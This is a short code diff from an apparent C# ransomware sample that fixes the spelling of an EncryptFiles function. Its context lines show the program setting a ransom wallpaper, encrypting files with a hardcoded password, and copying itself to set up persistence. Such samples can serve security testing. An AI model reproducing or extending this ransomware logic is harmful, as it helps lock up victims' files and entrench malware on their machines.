@@ -32,7 +32,7 @@ namespace cwg.sourceIL
             Wallpaper.Set(wallpaper, Wallpaper.Style.Stretched);
 
             //Encrypt the files
-            EncrytFiles();
+            EncryptFiles();
 
             //Copy file to documents directory and create persistence
             String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
@@ -72,7 +72,7 @@ namespace cwg.sourceIL
 
 
         //encrypt the files
-        private static void EncrytFiles()
+        private static void EncryptFiles()
         {
             IEnumerable<string> files = Enumerable.Empty<string>();
             String password = "ransombear";
